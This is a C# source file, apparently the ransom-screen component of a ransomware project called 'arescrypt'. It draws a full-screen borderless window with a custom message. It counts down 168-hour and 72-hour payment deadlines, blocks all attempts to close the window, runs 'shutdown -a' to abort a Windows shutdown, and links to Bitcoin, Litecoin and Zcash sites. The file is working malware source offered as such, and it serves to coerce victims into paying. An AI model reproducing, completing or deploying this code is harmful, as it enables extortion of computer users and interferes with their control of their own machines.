using System;
using System.Drawing;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace arescrypt
{
    public partial class Display : Form
    {

        [DllImport("user32.dll")]
        static extern void mouse_event(uint dwflag);

        public Display() {
            InitializeComponent();

            if (!Configuration.sandBox) // == false
            {   // This will maximize the screen, and eliminate the taskbar. 
                this.WindowState = FormWindowState.Maximized;
                this.FormBorderStyle = FormBorderStyle.None;
            }

            this.displayMessage.Text = Configuration.customDisplayMessage;
        }
        
        Point cursorPos = new Point(Screen.PrimaryScreen.WorkingArea.Size.Width / 2, Screen.PrimaryScreen.WorkingArea.Height / 2);

        // 168:00:00
        // 0xA8:0x00:0x00
        int lostTimer_Hours = 0xA8; int lostTimer_Minutes = 0x0; int lostTimer_Seconds = 0x0;
        private void lostTimer_Tick(object sender, EventArgs e)
        {
            string lostTimer_Hours_Text = lostTimer_Hours.ToString();
            string lostTimer_Minutes_Text = lostTimer_Minutes.ToString();
            string lostTimer_Seconds_Text = lostTimer_Seconds.ToString();

            if (lostTimer_Minutes == 0x0 && lostTimer_Seconds == 0x0)
            {
                lostTimer_Hours--; // Decrement 'Hours' variable
                lostTimer_Minutes = 0x3B; // 60
                lostTimer_Seconds = 0x3C;
            }
            else if (lostTimer_Seconds == 0x0)
            {
                lostTimer_Minutes--;
                lostTimer_Seconds = 60;
            }

            lostTimer_Seconds--;
            if (lostTimer_Hours_Text.Length == 1)
                lostTimer_Hours_Text = 0x0.ToString() + lostTimer_Hours_Text;
            if (lostTimer_Minutes_Text.Length == 1)
                lostTimer_Minutes_Text = 0x0.ToString() + lostTimer_Minutes_Text;
            if (lostTimer_Seconds_Text.Length == 1)
                lostTimer_Seconds_Text = 0x0.ToString() + lostTimer_Seconds_Text;

            paymentTimer_Lost.Text = lostTimer_Hours_Text + ":" + lostTimer_Minutes_Text + ":" + lostTimer_Seconds_Text;
        }

        // 72:00:00
        // 0x48:0x00:0x00
        int riseTimer_Hours = 0x48; int riseTimer_Minutes = 0x0; int riseTimer_Seconds = 0x0;
        private void riseTimer_Tick(object sender, EventArgs e)
        {
            string riseTimer_Hours_Text = riseTimer_Hours.ToString();
            string riseTimer_Minutes_Text = riseTimer_Minutes.ToString();
            string riseTimer_Seconds_Text = riseTimer_Seconds.ToString();

            if (riseTimer_Minutes == 0x0 && riseTimer_Seconds == 0x0)
            {
                riseTimer_Hours--; // Decrement 'Hours' variable
                riseTimer_Minutes = 0x3B; // 60
                riseTimer_Seconds = 0x3C;
            } else if (riseTimer_Seconds == 0x0)
            {
                riseTimer_Minutes--;
                riseTimer_Seconds = 60;
            }

            riseTimer_Seconds--;

            if (riseTimer_Hours_Text.Length == 1)
                riseTimer_Hours_Text = 0x0.ToString() + riseTimer_Hours_Text;
            if (riseTimer_Minutes_Text.Length == 1)
                riseTimer_Minutes_Text = 0x0.ToString() + riseTimer_Minutes_Text;
            if (riseTimer_Seconds_Text.Length == 1)
                riseTimer_Seconds_Text = 0x0.ToString() + riseTimer_Seconds_Text;
            
            paymentTimer_Rise.Text = riseTimer_Hours_Text + ":" + riseTimer_Minutes_Text + ":" + riseTimer_Seconds_Text;
        }

        private void preventClose(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            if (e.CloseReason == CloseReason.WindowsShutDown)
                Process.Start("shutdown", "-a");
        }

        private void aboutBitcoin_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        { Process.Start("https://bitcoin.org"); }

        private void aboutLitecoin_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        { Process.Start("https://litecoin.com/"); }

        private void aboutZcash_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        { Process.Start("https://z.cash/"); }
    }
}
